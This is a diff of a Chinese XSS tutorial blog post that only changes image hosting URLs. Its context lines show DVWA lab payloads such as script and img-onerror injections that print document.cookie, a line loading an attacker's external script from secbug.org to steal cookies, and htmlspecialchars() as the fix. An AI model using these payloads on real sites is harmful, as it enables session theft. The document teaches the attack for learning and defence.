@@ -43,7 +43,7 @@ JavaScript可以用来获取用户cookie，改变页面内容、url跳转，所�
 ```
 然后将formProcess_XSS目录丢到phpStudy的WWW目录下，浏览器访问`http://192.168.1.101/formProcess_XSS/index.html`，其中192.168.1.101表示虚拟服务器的地址，当在文本输入框中输入`<script>alert("XSS")</script>`，然后点击提交，就会触发XSS攻击，因为index.php未对用户输入的内容作处理，没有将html的字符处理为html实体，如下：
 
-![XSS攻击学习](http://ou3oh86t1.bkt.clouddn.com/XSS%E6%94%BB%E5%87%BB/XSS%E6%94%BB%E5%87%BB.png)
+![XSS攻击学习](https://githubblogbucket1-1258277786.cos.ap-shanghai.myqcloud.com/XSS%E6%94%BB%E5%87%BB%E5%AD%A6%E4%B9%A0/XSS%E6%94%BB%E5%87%BB.png)
 攻击者可以在`<script>`和`</script>`之间输入JavaScript代码，实现一定的攻击效果。在真实攻击中，攻击者不仅仅弹出一个框，通常使用`<script src="http://www.secbug.org/x.txt"></script>`方式来加载外部脚本，而在`x.txt`中存放着攻击者的恶意JavaScript代码，这段代码可能是用来盗取用户的Cookie，也可能是监控键盘记录等恶意行为。
 ## XSS类型 ##
 XSS主要分为三类，反射型(经过后端，不经过数据库)、存储型(经过后端，经过数据库)、DOM型(不经过后端)。
@@ -106,7 +106,7 @@ if( array_key_exists( "name", $_GET ) && $_GET[ 'name' ] != NULL ) {
 
 攻击代码：`<script>alert(document.cookie)</script>`
 效果:
-![DVWA-XSS-Reflected-LOW](http://ou3oh86t1.bkt.clouddn.com/XSS%E6%94%BB%E5%87%BB/DVWA-XSS-Reflect-LOW.png)
+![DVWA-XSS-Reflected-LOW](https://githubblogbucket1-1258277786.cos.ap-shanghai.myqcloud.com/XSS%E6%94%BB%E5%87%BB%E5%AD%A6%E4%B9%A0/DVWA-XSS-Reflect-LOW.png)
 
 （2）MEDIUM
 SOURCE:
@@ -171,9 +171,9 @@ if( array_key_exists( "name", $_GET ) && $_GET[ 'name' ] != NULL ) {
 ```
 当在文本输入框输入`<script>alert(document.cookie)</script>`或`<img src=1 onerror=alert(document.cookie)>`点击提交GET请求后，利用上述php代码中的`htmlspecialchars()`方法处理敏感字符后返回，避免XSS攻击。
 
-![XSS预防1](http://ou3oh86t1.bkt.clouddn.com/XSS%E6%94%BB%E5%87%BB/XSS%E9%A2%84%E9%98%B21.png)
+![XSS预防1](https://githubblogbucket1-1258277786.cos.ap-shanghai.myqcloud.com/XSS%E6%94%BB%E5%87%BB%E5%AD%A6%E4%B9%A0/XSS%E9%A2%84%E9%98%B21.png)
 
-![XSS预防2](http://ou3oh86t1.bkt.clouddn.com/XSS%E6%94%BB%E5%87%BB/XSS%E9%A2%84%E9%98%B22.png)
+![XSS预防2](https://githubblogbucket1-1258277786.cos.ap-shanghai.myqcloud.com/XSS%E6%94%BB%E5%87%BB%E5%AD%A6%E4%B9%A0/XSS%E9%A2%84%E9%98%B22.png)
 ### 存储型 XSS ###
 存储型XSS又称为持久性XSS，存储型XSS是最危险的一种跨站脚本。
 
